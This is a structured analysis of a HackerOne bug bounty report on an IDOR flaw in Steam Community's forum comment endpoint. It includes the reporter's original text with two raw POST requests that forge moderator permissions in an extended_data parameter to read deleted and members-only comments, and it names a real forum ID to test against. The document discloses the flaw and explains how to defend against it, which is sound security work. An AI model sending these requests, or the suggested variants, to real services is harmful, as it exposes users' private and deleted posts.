# Read Access to all comments on unauthorized forums' discussions! IDOR!

## Metadata
- **Source:** HackerOne
- **Report:** 308610 | https://hackerone.com/reports/308610
- **Submitted:** 2018-01-24
- **Reporter:** ta8ahi
- **Program:** Steam Community
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Insecure Direct Object Reference (IDOR), Broken Access Control, Information Disclosure, Privilege Escalation
- **CVEs:** None
- **Category:** web-api

## Summary
An IDOR vulnerability in Steam's forum comment system allows unauthorized users to read deleted comments and access comments from forums they shouldn't have permission to view. By manipulating the extended_data parameter in a POST request, members can view deleted comments and non-members can view all comments (including deleted ones) from restricted forums.

## Attack scenario
1. Attacker identifies a forum with restricted access permissions (e.g., members-only)
2. Attacker finds a discussion in the target forum and extracts the GroupID, forumID, and discussionID from the page source (ForumTopic_*** format)
3. Attacker crafts a POST request to /comment/ForumTopic/delete/[GroupID]/[forumID]/ with an extended_data parameter containing elevated permissions (can_moderate, can_delete, can_edit)
4. Attacker sends the malicious request with their own credentials while spoofing the permissions in extended_data
5. The backend fails to validate that the user's actual permissions match the claims in extended_data and returns all comments including deleted ones
6. Attacker parses the response for 'comments_raw' field to exfiltrate sensitive comments

## Root cause
The application performs insufficient server-side validation of user permissions. The extended_data parameter containing permission claims is trusted without verification against the actual user's database permissions. The /comment/ForumTopic/delete endpoint returns deleted comments without properly checking if the requesting user has moderator+ privileges.

## Attacker mindset
The attacker discovered that permission data is submitted client-side via the extended_data parameter and recognized the application isn't validating these permissions on the backend. They exploited this to bypass both access control (viewing restricted forums) and data sensitivity controls (viewing deleted comments), demonstrating systematic testing of permission boundaries.

## Defensive takeaways
- Never trust client-submitted permission or authorization claims; always verify permissions server-side from the user's account/session database
- Implement proper access control checks before returning any data, especially sensitive data like deleted comments
- For deleted content, verify the user has moderator+ role BEFORE including it in responses, regardless of client parameters
- Remove or sanitize extended_data parameters that shouldn't be user-controllable; compute permission state server-side only
- Implement comprehensive audit logging for access to sensitive content (deleted comments, restricted forums)
- Use a deny-by-default model: only return data if explicitly authorized, not if authorization is missing
- Add permission validation at both the endpoint and data retrieval layers to prevent bypass at any level

## Variant hunting
Test other endpoints that accept extended_data or similar client-side permission parameters for similar bypasses
Check if other content types (private messages, group posts, user profiles) have similar permission validation flaws
Investigate whether the include_raw parameter can be exploited in other contexts to expose raw/sensitive data
Test if the same technique works for other HTTP methods (GET, PUT, DELETE) on forum-related endpoints
Search for similar IDOR patterns in user-generated content endpoints across Steam (reviews, guides, broadcasts)
Examine whether oldestfirst and count parameters can be combined with permission bypass to exfiltrate bulk data

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1202 - Indirect Command Execution
- T1087 - Account Discovery
- T1526 - Enumerate External Targets

## Notes
This is a classic IDOR vulnerability compounded by improper trust in client-submitted authorization claims. The report is well-documented with clear reproduction steps. The vulnerability affects two distinct attack vectors: (1) privilege escalation within authorized users (members viewing deleted comments) and (2) complete access control bypass (non-members viewing restricted forums). The fact that the vulnerable endpoint uses /delete in the URL but accepts POST data with arbitrary comment content suggests endpoint confusion or misuse. The impact is significant as it exposes not just current content but also deleted/hidden discussions and comments which may contain sensitive information.

## Full report
<details><summary>Expand</summary>

hi,

For a forum's discussion, only ` moderator+ ` ranks are allowed to **view comments which have been deleted** by a ` officer/moderator `. 

I have found an issue where a ` member `(who is not allowed to view deleted comments) can get read access to the deleted comments on a forum's discussion.

Also, a ` non-member ` who ` can't view the discussions belonging to an unauthorized forum `, can **expose the comments** on discussions of such forums. He can get read access to all i.e ` even deleted ` comments on such forums.


##Steps to reproduce:
###First we try to expose deleted comments to a member rank user

* Have a forum with such permissions:
{F256910}
So, here ` members ` can view the discussions belonging to this forum, but aren't allowed to view any deleted comments.

Also, ` non-members ` **can't even view the discussions.**
* In the forum, have a discussion, which has some comments, and delete a few of them.

* From ` member ` account, visit the target discussion, ` view-source ` of the page, search for ` forumtopic_ ` where you will find the **GroupId**, **forumId**, **discussion-id** in ` ForumTopic_***GroupID***_***forumID***_***discussionID***  `  format. Note these down.
* now, with credentials (` cookies/sessionId `) belonging to a ` member ` account, make the following request:

```
POST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1
Host: steamcommunity.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Length: 597
Cookie: ***********member-cookies****
Connection: close

gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true



```

Provide the IDs you noted down as stated in the request. Keep the ` extended_data ` param as it is.

* send the request through
* in the response search for ` comments_raw `, you will see that even the deleted comments were shown to you.


###now Lets attempt to expose comments to a user who is not allowed to view the forum

* Now, with credentials (` cookies/sessionId `) belonging to a ` non-member ` account, make the following request:

```
POST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1
Host: steamcommunity.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Length: 597
Cookie: ***********member-cookies****
Connection: close

gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true

```
Provide the same IDs as in the previous request. Or you can try with ` ForumTopic_103582791461362746_1692659135923574526_1692659769940104935 `, these IDs belong to a **Group-->forum** which has view permissions set to ` members-only `.

In response, search for ` comments_raw  `, you will see all comments were exposed to a user who ` does not even have the permission to view this discussion `.

## Impact

* ` Non-members ` without having the access to ` view a forum ` can get **read access** to all comments including deleted comments on such forum discussions. 
* ` Members ` get **read access** to ` deleted comments ` on forum discussions.

All these attacks require no user interaction, i.e attacker can ex-filtrate these on his own machine.


thanks,
Tabahi

</details>

---
*Analysed by Claude on 2026-05-24*
